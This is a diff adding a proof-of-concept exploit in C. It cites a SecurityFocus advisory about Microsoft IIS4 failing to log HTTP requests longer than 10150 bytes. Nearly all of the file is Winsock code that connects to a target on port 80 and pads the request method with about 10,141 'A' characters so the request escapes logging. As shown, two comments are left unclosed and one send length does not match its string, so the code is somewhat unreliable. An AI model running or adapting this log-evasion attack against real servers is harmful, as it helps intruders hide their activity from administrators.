@@ -1,0 +1,101 @@
+source: http://www.securityfocus.com/bid/191/info
+
+An http get request against an IIS4 server will not be logged if the request is longer than 10150 bytes long. 
+
+/* Compile with eg Visual C++ and link with wsock32.lib
+
+#include <stdio.h>
+#include <winsock2.h>
+#include <string.h>
+
+
+int main (int argc, char *argv[])
+{
+int snd, rcv, err, portno,a=0,b, res;
+char resp[1024];
+WORD wVersionRequested;
+WSADATA wsaData;
+struct sockaddr_in sa;
+struct hostent *he;
+SOCKET sock;
+
+if (argc !=2)
+{
+printf("Usage:\nc:\\>%s target_machine\n\nDavid Litchfield\n21st January
+1999\n", argv[0]);
+return 0;
+}
+wVersionRequested = MAKEWORD( 2, 0 );
+err = WSAStartup( wVersionRequested, &wsaData );
+
+if ( err != 0 )
+{
+printf("No winsock.dll\n");
+return 0;
+}
+if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 )
+{
+printf("No winsock.dll - 2nd\n");
+WSACleanup( );
+return 0;
+}
+
+if ((he = gethostbyname(argv[1])) == NULL)
+{
+printf("Invalid Host\n");
+return 0;
+}
+
+
+
+
+sock=socket(AF_INET,SOCK_STREAM,0);
+if (sock==INVALID_SOCKET)
+{
+printf("Invalid Socket!\n");
+return 0;
+}
+else
+{
+printf("");
+}
+
+sa.sin_addr.s_addr=INADDR_ANY;
+sa.sin_family=AF_INET;
+
+
+
+bind(sock,(struct sockaddr *)&sa,sizeof(sa));
+
+
+
+sa.sin_port=htons(80);
+
+memcpy(&sa.sin_addr,he->h_addr,he->h_length);
+if(connect(sock,(struct sockaddr *)&sa,sizeof(sa)) < 0)
+{
+printf("Failed to connect!\n");
+}
+else
+{
+
+/* This loop creates the REQUEST_METHOD and makes it 10140 bytes long
+
+while (a < 10141)
+{
+snd=send(sock,"A", 1, 0);
+a ++;
+}
+snd=send(sock," /default.asp HTTP/1.0\n\n",43,0);
+rcv=recv(sock,resp,256,0);
+printf("\n%s",resp);
+rcv=recv(sock,resp,1024,0);
+printf("\n%s\n\n",resp);
+
+}
+
+
+closesocket(sock);
+
+return 0;
+} 
